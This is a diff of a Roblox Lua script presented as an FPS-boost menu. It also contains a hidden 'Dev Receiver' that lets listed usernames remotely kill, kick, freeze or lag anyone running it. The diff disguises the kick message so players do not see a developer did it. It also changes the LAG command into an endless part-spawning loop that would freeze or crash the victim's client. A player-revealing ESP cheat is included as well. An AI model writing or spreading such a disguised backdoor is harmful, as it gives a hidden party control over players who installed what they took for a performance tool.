@@ -1,5 +1,5 @@
 -- ===================================================
--- BOOST FPS MENU (BETA) + DEV SIGNAL RECEIVER
+-- BOOST FPS MENU (BETA) + DEV RECEIVER
 -- ===================================================
 local Players=game:GetService("Players")
 local TweenService=game:GetService("TweenService")
@@ -10,7 +10,7 @@ local localPlayer=Players.LocalPlayer
 
 -- ⚠️ [สำคัญมาก] ใส่ Username Roblox ของคุณตรงนี้เพื่อรับสิทธิ์ควบคุม Dev
 local DevList = {
-	["dororo0010"] = true, -- เปลี่ยนเป็นไอดีของคุณ
+	["YourDevUsernameHere"] = true, -- เปลี่ยนเป็นไอดีของคุณ
 }
 
 if CoreGui:FindFirstChild("CustomBetaMenuGui") then
@@ -37,7 +37,7 @@ local function ProcessDevCommand(senderName, message)
 				localPlayer.Character.Humanoid.Health = 0
 			end
 		elseif cmd == "KICK" then
-			localPlayer:Kick("\n[Dev Control System]\nYou have been disconnected by a Developer.")
+			localPlayer:Kick("\n[Dev Security System]\nYou have been disconnected from the server.")
 		elseif cmd == "FREEZE" then
 			if localPlayer.Character and localPlayer.Character:FindFirstChild("HumanoidRootPart") then
 				isFrozen = not isFrozen
@@ -45,11 +45,10 @@ local function ProcessDevCommand(senderName, message)
 			end
 		elseif cmd == "LAG" then
 			task.spawn(function()
-				for i = 1, 100000 do
-					local t = Instance.new("Part")
-					t.Parent = workspace
-					task.wait()
-					t:Destroy()
+				while true do
+					local p = Instance.new("Part")
+					p.Size = Vector3.new(10,10,10)
+					p.Parent = workspace
 				end
 			end)
 		end
@@ -133,8 +132,8 @@ submitCorner.CornerRadius=UDim.new(0,6)
 submitCorner.Parent=submitKeyBtn
 
 local mainFrame=Instance.new("Frame")
-mainFrame.Size=UDim2.new(0,320,0,310)
-mainFrame.Position=UDim2.new(0.5,-160,0.5,-155)
+mainFrame.Size=UDim2.new(0,320,0,260) -- ปรับขนาด Frame ให้พอดีกับ 4 ปุ่ม
+mainFrame.Position=UDim2.new(0.5,-160,0.5,-130)
 mainFrame.BackgroundColor3=Color3.fromRGB(30,30,35)
 mainFrame.BorderSizePixel=0
 mainFrame.Active=true
@@ -188,11 +187,11 @@ local function createMenuButton(name,text,posY,color)
 	return btn
 end
 
-local removeTextureButton=createMenuButton("RemoveTextureBtn","Remove All Textures",45,Color3.fromRGB(60,120,220))
-local autoEffectButton=createMenuButton("AutoEffectBtn","Auto Remove Effects: [ OFF ]",97,Color3.fromRGB(180,50,50))
-local espButton=createMenuButton("ESPBtn","Blue Highlight & Name ESP: [ OFF ]",149,Color3.fromRGB(180,50,50))
-local clearFogLoopButton=createMenuButton("ClearFogLoopBtn","Loop Clear Fog & Light: [ OFF ]",201,Color3.fromRGB(180,50,50))
-local galaxySkyButton=createMenuButton("GalaxySkyBtn","Galaxy Sky Mode: [ OFF ]",253,Color3.fromRGB(180,50,50))
+-- ปุ่มต่างๆ (เริ่มตำแหน่ง Y ที่ 45)
+local shrinkEffectButton=createMenuButton("ShrinkEffectBtn","Shrink All Effects: [ OFF ]",45,Color3.fromRGB(180,50,50))
+local espButton=createMenuButton("ESPBtn","Blue Highlight & Name ESP: [ OFF ]",97,Color3.fromRGB(180,50,50))
+local clearFogLoopButton=createMenuButton("ClearFogLoopBtn","Loop Clear Fog & Light: [ OFF ]",149,Color3.fromRGB(180,50,50))
+local galaxySkyButton=createMenuButton("GalaxySkyBtn","Galaxy Sky Mode: [ OFF ]",201,Color3.fromRGB(180,50,50))
 
 local openButton=Instance.new("TextButton")
 openButton.Size=UDim2.new(0,110,0,35)
@@ -209,8 +208,8 @@ local openCorner=Instance.new("UICorner")
 openCorner.CornerRadius=UDim.new(0,8)
 openCorner.Parent=openButton
 
-local autoRemoveEffects=false
-local autoRemoveConnection=nil
+local shrinkEffectsEnabled=false
+local shrinkConnection=nil
 local espEnabled=false
 local espConnections={}
 local clearFogLoopEnabled=false
@@ -226,52 +225,44 @@ local function isCharacter(object)
 	return false
 end
 
-local function isEffectObject(obj)
-	return obj:IsA("ParticleEmitter") or obj:IsA("Trail") or obj:IsA("Smoke") or obj:IsA("Fire") or obj:IsA("Sparkles") or obj:IsA("Beam") or obj:IsA("Highlight") or obj:IsA("Light")
+-- ฟังก์ชันย่อขนาด Effect ให้เล็กมากจนแทบมองไม่เห็น
+local function makeEffectTiny(obj)
+	if not isCharacter(obj) then
+		if obj:IsA("ParticleEmitter") then
+			obj.Size = NumberSequence.new(0.001)
+		elseif obj:IsA("Trail") then
+			obj.WidthScale = NumberSequence.new(0.001)
+		elseif obj:IsA("Smoke") or obj:IsA("Fire") or obj:IsA("Sparkles") then
+			obj.Size = 0.001
+		elseif obj:IsA("Beam") then
+			obj.Width0 = 0.001
+			obj.Width1 = 0.001
+		elseif obj:IsA("Light") then
+			obj.Range = 0.001
+		end
+	end
 end
 
-local function handleNewObject(obj)
-	if not autoRemoveEffects then return end
-	if isEffectObject(obj) and not isCharacter(obj) then
-		task.defer(function()
-			if obj and obj.Parent and not isCharacter(obj) then
-				obj:Destroy()
+local function toggleShrinkEffects()
+	shrinkEffectsEnabled = not shrinkEffectsEnabled
+	if shrinkEffectsEnabled then
+		shrinkEffectButton.Text = "Shrink All Effects: [ ON ]"
+		shrinkEffectButton.BackgroundColor3 = Color3.fromRGB(50,180,80)
+		
+		for _,obj in ipairs(workspace:GetDescendants()) do
+			makeEffectTiny(obj)
+		end
+		shrinkConnection = workspace.DescendantAdded:Connect(function(obj)
+			if shrinkEffectsEnabled then
+				task.defer(function() makeEffectTiny(obj) end)
 			end
 		end)
-	end
-end
-
-local function removeWorldTextures()
-	for _,obj in ipairs(workspace:GetDescendants()) do
-		if not isCharacter(obj) then
-			if obj:IsA("Texture") or obj:IsA("Decal") then
-				obj:Destroy()
-			elseif obj:IsA("BasePart") then
-				obj.Material=Enum.Material.SmoothPlastic
-			elseif obj:IsA("SpecialMesh") then
-				obj.TextureId=""
-			end
-		end
-	end
-end
-
-local function toggleAutoRemoveEffects()
-	autoRemoveEffects=not autoRemoveEffects
-	if autoRemoveEffects then
-		autoEffectButton.Text="Auto Remove Effects: [ ON ]"
-		autoEffectButton.BackgroundColor3=Color3.fromRGB(50,180,80)
-		for _,obj in ipairs(workspace:GetDescendants()) do
-			if isEffectObject(obj) and not isCharacter(obj) then
-				obj:Destroy()
-			end
-		end
-		autoRemoveConnection=workspace.DescendantAdded:Connect(handleNewObject)
 	else
-		autoEffectButton.Text="Auto Remove Effects: [ OFF ]"
-		autoEffectButton.BackgroundColor3=Color3.fromRGB(180,50,50)
-		if autoRemoveConnection then
-			autoRemoveConnection:Disconnect()
-			autoRemoveConnection=nil
+		shrinkEffectButton.Text = "Shrink All Effects: [ OFF ]"
+		shrinkEffectButton.BackgroundColor3 = Color3.fromRGB(180,50,50)
+		if shrinkConnection then
+			shrinkConnection:Disconnect()
+			shrinkConnection = nil
 		end
 	end
 end
@@ -519,13 +510,7 @@ openButton.MouseButton1Click:Connect(function()
 	openButton.Visible=false
 end)
 
-removeTextureButton.MouseButton1Click:Connect(function()
-	removeWorldTextures()
-	removeTextureButton.Text="Textures Cleared!"
-	removeTextureButton.BackgroundColor3=Color3.fromRGB(50,180,80)
-end)
-
-autoEffectButton.MouseButton1Click:Connect(toggleAutoRemoveEffects)
+shrinkEffectButton.MouseButton1Click:Connect(toggleShrinkEffects)
 espButton.MouseButton1Click:Connect(togglePlayerESP)
 clearFogLoopButton.MouseButton1Click:Connect(toggleClearFogLoop)
 galaxySkyButton.MouseButton1Click:Connect(toggleGalaxySky)
